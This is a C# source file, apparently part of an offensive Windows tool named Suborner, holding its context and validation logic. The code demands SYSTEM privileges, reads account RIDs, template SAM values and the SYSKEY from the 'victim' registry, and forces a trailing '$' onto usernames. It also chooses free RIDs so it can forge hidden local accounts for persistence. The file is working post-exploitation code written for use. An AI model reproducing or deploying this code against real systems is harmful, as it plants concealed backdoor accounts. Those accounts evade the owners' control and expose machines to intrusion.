using Suborner.Module;
using Suborner.Module.SAM;
using Suborner.UI;
using System;
using System.Linq;
using System.Runtime.InteropServices;

namespace Suborner.Core
{
    /// <summary>
    /// Class <c>SubornerContext</c> is a singleton instance containing the data related to the current execution and validation logic
    /// </summary>
    public sealed class SubornerContext
    {
        // Singleton session object for unique data
        private static readonly Lazy<SubornerContext> lazy =
        new Lazy<SubornerContext>(() => new SubornerContext());
        public static SubornerContext Instance { get { return lazy.Value; } }

        public User User { get; set; }
        public int TemplateAccountRID { get; set; }
        public bool IsSystem { get; set; }
        public int[] LocalAccountsRIDs { get; set; }  // Contains the list of the RIDs of existent current users
        public byte[] TemplateF { get; set; }
        public byte[] TemplateV { get; set; }
        public DOMAIN_ACCOUNT_F DomainAccountF { get; set; }
        public byte[] SysKey { get; set; }

        // TODO: Refactor to SamAccount object
        public string NewNames { get; set; }
        public byte[] NewF { get; set; }       
        public byte[] NewV { get; set; }

        // This is needed only for Names Key importing
        // TODO: Make it totaly fileless! Or at least dynamic!
        public string cwd = String.Format("{0}\\Tasks\\", Environment.GetEnvironmentVariable("windir"));

        public bool IsDebug { get; set; }

        public void ValidateContext()
        {
            LoadSystemData();
            ValidateUsername();
            ValidateRID();
            ValidateTemplateAccountRID();
        }
        private SubornerContext()
        {
            TemplateAccountRID = 0;
            User = new User();

            // Validate if program is executed as NT SYSTEM
            using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
            {
                IsSystem = identity.IsSystem;
            }
            if (!IsSystem)
            {
                Logger.PrintError("Error: You need SYSTEM privileges to suborn Windows :(");
                System.Environment.Exit(1);
            }
        }
        /// <summary>
        /// The <c>LoadSystemData</c> method loads from the victim the information needed for the process
        /// </summary>
        private void LoadSystemData() 
        {
            LocalAccountsRIDs = RegistryManager.GetUsersRIDs();

            RegistryManager.GetUserData(TemplateAccountRID, out byte[] templateFValue, out byte[] templateVValue);
            TemplateF = templateFValue;
            TemplateV = templateVValue;

            // Parse unmanaged byte array to DOMAIN_ACCOUNT_F
            GCHandle pDomAccF = GCHandle.Alloc(RegistryManager.GetSamDomainAccountF(), GCHandleType.Pinned);
            DomainAccountF = (DOMAIN_ACCOUNT_F)Marshal.PtrToStructure(pDomAccF.AddrOfPinnedObject(), 
                                            typeof(DOMAIN_ACCOUNT_F));
            pDomAccF.Free();

            SysKey = RegistryManager.GetSysKey();
            Logger.PrintDebug(String.Format("Retrieved SYSKEY: {0}", Utility.ByteArrayToString(SysKey)));
        }
        private void ValidateUsername() {
            // Didn't add special characters sanitization if you ever want to experiment with them :)
            if (User.Username.Equals("<HOSTNAME>$"))
            {
                // TODO: Retrieve this from registry
                Logger.PrintInfo("Retrieving hostname");
                User.Username = RegistryManager.GetHostname() + "$";
                return;
            }
            if (!User.Username.EndsWith("$"))
            {
                Logger.PrintInfo("Appending $ to username");
                User.Username += "$";
            }
        }
        private void ValidateRID() 
        {
            switch (User.RID)
            {
                case 0:  // Gets the next RID
                    if (LocalAccountsRIDs[LocalAccountsRIDs.Length - 1] < 1000) 
                    {
                        User.RID = 1000;
                    }
                    else User.RID = LocalAccountsRIDs[LocalAccountsRIDs.Length-1] + 1;
                    break;
                case 500:
                    Logger.PrintError("Error: I shouldn't let you overwrite the 500 built-in account!");
                    System.Environment.Exit(1);
                    break;
                case 501:
                    Logger.PrintError("Error: I shouldn't let you overwrite the 501 built-in account!");
                    System.Environment.Exit(1);
                    break;
                case 502:
                    Logger.PrintError("Error: I shouldn't let you overwrite the 502 built-in account!");
                    System.Environment.Exit(1);
                    break;
                case 503:
                    Logger.PrintError("Error: I shouldn't let you overwrite the 503 built-in account!");
                    System.Environment.Exit(1);
                    break;
                case 504:
                    Logger.PrintError("Error: I shouldn't let you overwrite the 504 built-in account!");
                    System.Environment.Exit(1);
                    break;
                case int r when r < 0:
                    Logger.PrintError("Error: I shouldn't assign a negative RID to this account");
                    System.Environment.Exit(1);
                    break;
                case int r when r >= 65535:
                    Logger.PrintError("Error: I shouldn't assign a RID >= 65535 to this account");
                    System.Environment.Exit(1);
                    break;

            }
        }

        private void ValidateTemplateAccountRID()
        {
            switch (TemplateAccountRID)
            {
                case int r when r < 0:
                    Logger.PrintError("Error: I am sure there is no local account with a negative RID");
                    System.Environment.Exit(1);
                    break;
                case int r when r >= 65535:
                    Logger.PrintError("Error: I am sure there is no local account with RID >= 65535");
                    System.Environment.Exit(1);
                    break;
                default:
                    if (!LocalAccountsRIDs.Contains(TemplateAccountRID)) 
                    {
                        Logger.PrintError("Error: The account you want to use as a template does not exist");
                        System.Environment.Exit(1);
                    }
                    break;
            }
        }
    }
}
